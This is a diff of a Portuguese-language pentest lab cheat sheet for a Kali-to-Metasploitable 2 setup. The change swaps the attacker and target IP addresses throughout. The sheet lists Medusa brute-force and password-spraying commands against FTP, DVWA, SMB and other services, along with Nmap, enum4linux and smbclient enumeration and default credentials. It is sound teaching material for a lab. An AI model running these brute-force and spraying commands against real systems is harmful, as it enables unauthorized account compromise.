@@ -1,7 +1,7 @@
 # 02 — Cheat sheet: Medusa, Nmap e enum4linux
 
 > Todos os comandos assumem o laboratório do [`01-ambiente.md`](01-ambiente.md):
-> **atacante** `192.168.56.102` (Kali) → **alvo** `192.168.56.101` (Metasploitable 2).
+> **atacante** `192.168.56.101` (Kali) → **alvo** `192.168.56.102` (Metasploitable 2).
 
 ---
 
@@ -59,36 +59,36 @@ medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] \
 medusa -d | grep ftp
 
 # Um usuário e uma senha
-medusa -h 192.168.56.101 -u msfadmin -p msfadmin -M ftp
+medusa -h 192.168.56.102 -u msfadmin -p msfadmin -M ftp
 
 # Força bruta com listas (cenário 1 do desafio)
-medusa -h 192.168.56.101 \
+medusa -h 192.168.56.102 \
        -U wordlists/usuarios.txt \
        -P wordlists/senhas.txt \
        -M ftp -e ns -t 4 -c 1000 -f \
        -O logs/ftp-resultado.txt
 
 # Testar sem senha e senha=usuario
-medusa -h 192.168.56.101 -U wordlists/usuarios.txt -M ftp -e ns -t 2
+medusa -h 192.168.56.102 -U wordlists/usuarios.txt -M ftp -e ns -t 2
 
 # Servidor com anti-bruteforce agressivo (vsftpd): reduzir threads e aumentar -c
-medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt \
+medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt \
        -M ftp -t 1 -c 2000 -r 5
 
 # FTP com TLS explícito em porta alternativa
-medusa -h 192.168.56.101 -n 990 -s -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
+medusa -h 192.168.56.102 -n 990 -s -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
 ```
 
 ### 2.2 Formulário web (DVWA)
 
 ```bash
 # Reproduzir a estrutura do formulário
-curl -s http://192.168.56.101/dvwa/login.php | grep -E 'form|input'
+curl -s http://192.168.56.102/dvwa/login.php | grep -E 'form|input'
 
 # Sintaxe do FORM-DATA: <metodo>?<campo_usuario>=&<campo_senha>=&<botao>=<valor>
 # 1º campo = usuário | 2º campo = senha  (nesta ordem!)
 
-medusa -h 192.168.56.101 \
+medusa -h 192.168.56.102 \
        -u admin \
        -P wordlists/senhas.txt \
        -M web-form \
@@ -115,18 +115,18 @@ medusa -h 192.168.56.101 \
 
 ```bash
 # Sintaxe básica
-medusa -h 192.168.56.101 -U wordlists/usuarios-smb.txt -p password -M smbnt -t 2
+medusa -h 192.168.56.102 -U wordlists/usuarios-smb.txt -p password -M smbnt -t 2
 
 # Com domínio
-medusa -h 192.168.56.101 -U wordlists/usuarios-smb.txt -p password \
+medusa -h 192.168.56.102 -U wordlists/usuarios-smb.txt -p password \
        -M smbnt -m GROUP:LAB -t 2
 
 # Rodada completa de spraying (script do repositório)
-./scripts/smb_spray.sh --alvo 192.168.56.101 --confirmo-lab
+./scripts/smb_spray.sh --alvo 192.168.56.102 --confirmo-lab
 
 # Com log por rodada
 for senha in password msfadmin Senha@123; do
-  medusa -h 192.168.56.101 \
+  medusa -h 192.168.56.102 \
          -U wordlists/usuarios-smb.txt \
          -p "$senha" \
          -M smbnt -t 2 \
@@ -139,27 +139,27 @@ done
 
 ```bash
 # SSH — NÃO usado aqui (porta 22 está fora do escopo do desafio)
-medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ssh
+medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ssh
 
 # MySQL
-medusa -h 192.168.56.101 -U root -P wordlists/senhas.txt -M mysql
+medusa -h 192.168.56.102 -U root -P wordlists/senhas.txt -M mysql
 
 # PostgreSQL
-medusa -h 192.168.56.101 -U postgres -P wordlists/senhas.txt -M postgres
+medusa -h 192.168.56.102 -U postgres -P wordlists/senhas.txt -M postgres
 
 # VNC (somente senha, sem usuário)
-medusa -h 192.168.56.101 -P wordlists/senhas.txt -M vnc -e n
+medusa -h 192.168.56.102 -P wordlists/senhas.txt -M vnc -e n
 
 # HTTP Basic Auth
-medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M http
+medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M http
 ```
 
 ### 2.5 Interpretando a saída
 
 ```text
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root ...
-ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
-ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: root Password: (blank) [SUCCESS]
+ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root ...
+ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: root Password: (blank) [SUCCESS]
 ```
 
 | String | Significado |
@@ -175,28 +175,28 @@ ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: root Password: (blank) [SUCCESS]
 
 ```bash
 # Reconhecimento básico das portas do desafio
-nmap -Pn -sV -p 21,80,139,445 192.168.56.101
+nmap -Pn -sV -p 21,80,139,445 192.168.56.102
 
 # Detecção de SO e scripts leves
-nmap -Pn -sV -O --osscan-guess -p- 192.168.56.101    # -p- é demorado; use só no início
+nmap -Pn -sV -O --osscan-guess -p- 192.168.56.102    # -p- é demorado; use só no início
 
 # FTP: verifica login anônimo
-nmap -Pn -p 21 --script ftp-anon 192.168.56.101
+nmap -Pn -p 21 --script ftp-anon 192.168.56.102
 
 # FTP: banner e capacidades (FEAT)
-nmap -Pn -p 21 --script "ftp-syst,ftp-features" 192.168.56.101
+nmap -Pn -p 21 --script "ftp-syst,ftp-features" 192.168.56.102
 
 # SMB: shares, usuários, políticas
-nmap -Pn -p 139,445 --script "smb-enum-shares,smb-enum-users" 192.168.56.101
-nmap -Pn -p 139,445 --script "smb-os-discovery,smb-security-mode" 192.168.56.101
-nmap -Pn -p 445 --script "smb-vuln-*" 192.168.56.101
+nmap -Pn -p 139,445 --script "smb-enum-shares,smb-enum-users" 192.168.56.102
+nmap -Pn -p 139,445 --script "smb-os-discovery,smb-security-mode" 192.168.56.102
+nmap -Pn -p 445 --script "smb-vuln-*" 192.168.56.102
 
 # HTTP: título, métodos e diretórios comuns
-nmap -Pn -p 80 --script "http-title,http-methods" 192.168.56.101
-nmap -Pn -p 80 --script http-enum 192.168.56.101
+nmap -Pn -p 80 --script "http-title,http-methods" 192.168.56.102
+nmap -Pn -p 80 --script http-enum 192.168.56.102
 
 # Saída em todos os formatos (bom para documentar)
-nmap -Pn -sV -p 21,80,139,445 -oA logs/nmap-inicial 192.168.56.101
+nmap -Pn -sV -p 21,80,139,445 -oA logs/nmap-inicial 192.168.56.102
 ```
 
 ### Interpretando o resultado
@@ -222,23 +222,23 @@ e `net`.
 
 ```bash
 # Enumeração completa (recomendado na primeira vez)
-enum4linux -a 192.168.56.101
+enum4linux -a 192.168.56.102
 
 # Só usuários — formato pronto para wordlist
-enum4linux -U 192.168.56.101
-enum4linux -U 192.168.56.101 | grep 'user:\[' | sed -E 's/.*user:\[([^]]+)\].*/\1/' > wordlists/usuarios-enumerados.txt
+enum4linux -U 192.168.56.102
+enum4linux -U 192.168.56.102 | grep 'user:\[' | sed -E 's/.*user:\[([^]]+)\].*/\1/' > wordlists/usuarios-enumerados.txt
 
 # Só shares
-enum4linux -S 192.168.56.101
+enum4linux -S 192.168.56.102
 
 # Política de senha (min length, lockout threshold, duração)
-enum4linux -P 192.168.56.101
+enum4linux -P 192.168.56.102
 
 # Grupos e membros
-enum4linux -G 192.168.56.101
+enum4linux -G 192.168.56.102
 
 # Com credencial válida (enumeração autenticada traz muito mais)
-enum4linux -a -u msfadmin -p msfadmin 192.168.56.101
+enum4linux -a -u msfadmin -p msfadmin 192.168.56.102
 ```
 
 ### O que cada seção entrega
@@ -261,23 +261,23 @@ enum4linux -a -u msfadmin -p msfadmin 192.168.56.101
 
 ```bash
 # FTP
-ftp 192.168.56.101               # digitando usuário/senha
-curl -s --user msfadmin:msfadmin ftp://192.168.56.101/ --list-only
+ftp 192.168.56.102               # digitando usuário/senha
+curl -s --user msfadmin:msfadmin ftp://192.168.56.102/ --list-only
 
 # SMB
-smbclient -L //192.168.56.101 -N                          # sem credencial
-smbclient -L //192.168.56.101 -U msfadmin%msfadmin        # com credencial
-smbclient //192.168.56.101/tmp -U msfadmin%msfadmin       # acessar share
+smbclient -L //192.168.56.102 -N                          # sem credencial
+smbclient -L //192.168.56.102 -U msfadmin%msfadmin        # com credencial
+smbclient //192.168.56.102/tmp -U msfadmin%msfadmin       # acessar share
 #   smb: \> ls
 #   smb: \> get arquivo.txt
 #   smb: \> put local.txt            (testar escrita)
 
 # rpcclient (com credencial)
-rpcclient -U msfadmin%msfadmin 192.168.56.101 -c 'enumdomusers'
+rpcclient -U msfadmin%msfadmin 192.168.56.102 -c 'enumdomusers'
 
 # Web / DVWA
-curl -s -c cookies.txt http://192.168.56.101/dvwa/login.php | grep -o 'user_token.*'
-python3 scripts/dvwa_login_check.py --url http://192.168.56.101/dvwa \
+curl -s -c cookies.txt http://192.168.56.102/dvwa/login.php | grep -o 'user_token.*'
+python3 scripts/dvwa_login_check.py --url http://192.168.56.102/dvwa \
         --usuario admin --senha password --confirmo-lab
 ```
 
@@ -300,7 +300,7 @@ bash -n scripts/*.sh
 python3 -m py_compile scripts/dvwa_login_check.py
 
 # Preflight completo
-./scripts/preflight_lab.sh --alvo 192.168.56.101 --confirmo-lab -v
+./scripts/preflight_lab.sh --alvo 192.168.56.102 --confirmo-lab -v
 ```
 
 ---
